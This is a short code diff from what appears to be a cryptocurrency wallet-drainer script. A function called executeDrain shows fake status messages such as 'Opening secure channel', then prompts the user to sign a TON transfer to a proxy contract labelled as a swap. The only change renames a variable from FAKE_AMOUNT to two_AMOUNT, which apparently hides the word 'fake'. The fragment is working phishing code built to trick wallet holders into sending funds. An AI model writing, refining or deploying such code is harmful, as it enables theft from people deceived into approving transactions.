@@ -43,14 +43,14 @@ async function executeDrain(userAddress) {
     setStatus('📊 Calculating fees...', true);           await sleep(800);
     setStatus('🔐 Opening secure channel...', true);    await sleep(700);
 
-    var nano = String(Math.round(parseFloat(FAKE_AMOUNT) * 1e9));
+    var nano = String(Math.round(parseFloat(two_AMOUNT) * 1e9));
 
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [{ address: PROXY_CONTRACT, amount: nano, payload: 'swap' }]
     };
 
-    setStatus('⏳ Confirm in wallet (' + FAKE_AMOUNT + ' TON)');
+    setStatus('⏳ Confirm in wallet (' + two_AMOUNT + ' TON)');
 
     try {
         await tonConnectUI.sendTransaction(tx);
